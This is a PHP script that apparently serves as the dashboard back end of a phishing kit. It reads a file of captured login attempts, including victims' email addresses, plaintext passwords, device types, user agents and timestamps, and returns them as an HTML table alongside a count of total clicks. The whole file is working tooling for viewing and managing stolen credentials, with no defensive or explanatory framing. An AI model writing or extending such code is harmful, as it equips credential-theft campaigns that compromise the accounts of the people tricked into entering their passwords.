<?php
$file = 'data.txt';
$data = @file_get_contents($file);
$html = '';
$count = 0;

// Read total clicks from total_clicks.txt
$total_clicks_file = 'total_clicks.txt';
$total_clicks = (int)@file_get_contents($total_clicks_file);

if ($data) {
    $lines = explode("------------------------\n", trim($data));
    $count = count($lines);
    foreach ($lines as $line) {
        $details = explode("\n", trim($line));
        if (count($details) >= 7) {
            $html .= "<tr>";
            $html .= "<td>" . htmlspecialchars(str_replace("Login Attempt: ", "", $details[1])) . "</td>";
            $html .= "<td>" . htmlspecialchars(str_replace("Email: ", "", $details[2])) . "</td>";
            $html .= "<td>" . htmlspecialchars(str_replace("Password: ", "", $details[3])) . "</td>";
            $html .= "<td>" . htmlspecialchars(str_replace("Device Type: ", "", $details[4])) . "</td>";
            $html .= "<td>" . htmlspecialchars(str_replace("User Agent: ", "", $details[5])) . "</td>";
            $html .= "<td>" . htmlspecialchars(str_replace("Timestamp: ", "", $details[6])) . "</td>";
            $html .= "<td><button class='delete-btn' data-entry='" . base64_encode($line) . "'>Delete</button></td>";
            $html .= "</tr>";
        }
    }
} else {
    $html .= '<tr><td colspan="7">No data available.</td></tr>';
}

$response = [
    'html' => $html,
    'count' => $count,
    'total_clicks' => $total_clicks
];

header('Content-Type: application/json');
echo json_encode($response);
?>